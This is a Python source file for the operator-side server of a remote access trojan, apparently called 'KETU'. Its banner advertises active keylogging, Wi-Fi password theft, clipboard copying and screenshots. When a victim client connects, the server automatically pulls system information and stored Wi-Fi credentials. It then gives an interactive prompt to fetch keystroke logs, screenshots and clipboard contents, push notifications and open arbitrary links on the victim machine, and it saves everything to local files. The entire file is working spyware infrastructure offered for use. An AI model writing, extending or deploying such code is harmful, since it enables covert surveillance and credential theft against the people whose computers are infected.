try:
    import socket
    import os
    import json
    import base64
    import argparse
    import datetime
except ImportError as e:
    import subprocess
    import sys
    missing_module = str(e).split("'")[1]
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', missing_module])

parser = argparse.ArgumentParser(description="Server for Remote Control")
parser.add_argument("--address", type=str, help="Server IP address")

args = parser.parse_args()

SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # IPv4 | TCP/IP
PORT = 6969
FORMAT = "utf-8"
ADDRESS = (args.address, 6969) if args.address else (socket.gethostname(), 6969)
PROMPT = "# "

SERVER.bind(ADDRESS)
SERVER.listen(1)

BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
RESET = "\033[0m"  # Reset to default color

def banner():
    print(f"{PROMPT}\n{PROMPT}{YELLOW}██   ██ ███████ ████████ ██    ██{RESET}")
    print(f"{PROMPT}{YELLOW}██  ██  ██         ██    ██    ██{RESET}")
    print(f"{PROMPT}{YELLOW}█████   █████      ██    ██    ██{RESET}")
    print(f"{PROMPT}{YELLOW}██  ██  ██         ██    ██    ██{RESET}")
    print(f"{PROMPT}{YELLOW}██   ██ ███████    ██     ██████ {RESET}")
    print(f"{PROMPT}\n{PROMPT}{YELLOW}             {RED}github.com/ashokasec{RESET}")
    print(f"{PROMPT}\n{PROMPT}{YELLOW}Features: {GREEN}System Information {RESET}| {GREEN}WIFI Passwords {RESET}| {GREEN}Copy Clipboard {RESET}| {GREEN}Take Screenshot {RESET}| {GREEN}ACTIVE KEYLOGGING{RESET} | {GREEN}Notify{RESET} | {GREEN}Open Arbitrary Links{RESET}")
    print(f"{PROMPT}\n{PROMPT}Server Started at {socket.gethostbyname(socket.gethostname())}:{PORT}\n{PROMPT}")
    print(f"{PROMPT}Max Connections: 1")
    print(f"{PROMPT}\n{PROMPT}Listening for incoming session requests...")

def save_JSON(data):
    with open("data.json", "w") as json_file:
        json.dump(data, json_file, indent=4)

def display_help():
    print(f"{PROMPT} Available Commands:")
    print(f"{PROMPT} - sysinfo      : Request system information from the client.")
    print(f"{PROMPT} - show_wifi    : Show all past connected Wireless SSIDs & their Passwords.")
    print(f"{PROMPT} - cp_clipb     : Request the client to copy its clipboard content.")
    print(f"{PROMPT} - notify       : Send a notification to the client.")
    print(f"{PROMPT} - open_link    : Open a provided link in the client's default web browser.")
    print(f"{PROMPT} - screenshot   : Take and receive a screenshot from the client.")
    print(f"{PROMPT} - get_keys     : Fetch the key log file from the client.")
    print(f"{PROMPT} - help         : Display available commands and their descriptions.")
    print(f"{PROMPT} - exit         : Terminate the connection and close the server.")

def timeStamp():
    date = datetime.datetime.now()
    year = date.year
    month = date.month
    current_date = date.day
    hour = date.hour
    minute = date.minute
    second = date.second
    microsecond = date.microsecond
    
    timestamp = f"{year}{month}{current_date}_{hour}_{minute}_{second}_{microsecond}"

    return timestamp

SESSION_DATA = {
    "sysinfo": {},
    "show_wifi": [],
    "cp_clipb": "",
}

def save_screenshot(data):
    ss_path = "./screenshots"
    timestamp = timeStamp()
    screenshot_name = f"screenshot_{timestamp}.png"
    img_data = f"{ss_path}/{screenshot_name}"
    if not os.path.exists(ss_path):
        os.makedirs(ss_path)
    with open(img_data, "wb") as file:
        file.write(data)
    print(f"# Screenshot received & Saved as '{img_data}'.")

def save_keys(data):
    with open("./logs.txt", "wb") as file:
        file.write(data)
    print(f"# Keys Data received & saved as './log.txt'.")

def save_session_data():
    session_time = timeStamp()
    file_path = "./data.json"

    # Check if the file exists
    if os.path.exists(file_path):
        try:
            with open(file_path, "r") as json_file:
                existing_data = json.load(json_file)
        except (json.JSONDecodeError, FileNotFoundError):
            # If the file exists but is not valid JSON or other issues, initialize with an empty dictionary
            existing_data = {}
    else:
        existing_data = {}  # Create an empty dictionary if the file doesn't exist

    # Create a new dictionary with your data and prepend it to the existing data
    new_data = {session_time: SESSION_DATA, **existing_data}

    with open(file_path, "w") as json_file:
        json.dump(new_data, json_file, indent=4)



def main():
    try:
        banner()
        while True:
            client_socket, client_address = SERVER.accept()
            print(f"{PROMPT}")
            print(f"{PROMPT}Connection from {client_address} has been established!")
            
            try:
                client_socket.send("sysinfo".encode(FORMAT))
                sysinfo_data = client_socket.recv(1024).decode(FORMAT)
                decoded_string = base64.b64decode(sysinfo_data).decode('utf-8')
                data_to_save = json.loads(decoded_string)
                SESSION_DATA["sysinfo"] = data_to_save
                print("Added SYSTEM INFO in session data")
            except Exception as e:
                print("Error fetching system information:", e)
            
            try:
                client_socket.send("show_wifi".encode(FORMAT))
                wifi = client_socket.recv(1024).decode(FORMAT)
                decoded_string = base64.b64decode(wifi).decode('utf-8')
                data_to_save = json.loads(decoded_string)
                SESSION_DATA["show_wifi"] = data_to_save
                print("Added WIFI KEYS & VALUES in session data")
            except Exception as e:
                print("Error fetching system information:", e)


            while True:
                command = input(f"{PROMPT}\n{PROMPT}Enter Command : ")

                if command == "exit":
                    save_session_data()
                    print(SESSION_DATA)
                    client_socket.send("exit".encode(FORMAT))
                    client_socket.close()
                    SERVER.close()
                    return
                
                elif command == "help":
                    display_help()

                elif command == "screenshot":
                    client_socket.send("screenshot".encode(FORMAT))
                    screenshot_data = b""
                    while True:
                        chunk = client_socket.recv(4096)
                        if not chunk:
                            break
                        screenshot_data += chunk
                        if len(chunk) < 4096:
                            break
                    save_screenshot(screenshot_data)
                    print("# Screenshot received and saved.")

                elif command == "cp_clipb":
                    client_socket.send("cp_clipb".encode(FORMAT))
                    received_data = b""  # Initialize as byte string for binary data

                    while True:
                        chunk = client_socket.recv(4096)
                        if not chunk:
                            break
                        received_data += chunk
                        if len(chunk) < 4096:
                            break
                    print(received_data)
                    print("----------------")
                    encoded_data = base64.b64encode(received_data).decode('utf-8')
                    SESSION_DATA["cp_clipb"] = encoded_data
                    print(SESSION_DATA["cp_clipb"])
                    print("Added INFORMATION DATA in session data")

                elif command == "clear":
                    os.system('cls')

                elif command == "notify":
                    client_socket.send("notify".encode(FORMAT))
                    title = input("Enter Title: ")
                    message = input("Enter the message: ")
                    data_to_send = {
                        "title": title,
                        "message": message
                    }
                    json_data = json.dumps(data_to_send)
                    client_socket.send(json_data.encode(FORMAT))

                elif command == "open_link":
                    client_socket.send("open_link".encode(FORMAT))
                    link = input("Enter Link: ")
                    data_to_send = {
                        "link": link
                    }
                    json_data = json.dumps(data_to_send)
                    client_socket.send(json_data.encode(FORMAT))

                elif command == "get_keys":
                    client_socket.send("get_keys".encode(FORMAT))
                    keys_data = b""
                    while True:
                        chunk = client_socket.recv(4096)
                        if not chunk:
                            break
                        keys_data += chunk
                        if len(chunk) < 4096:
                            break
                    save_keys(keys_data)
                    
                else:
                    print(f"{PROMPT}[ERROR] Invalid Command")
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    main()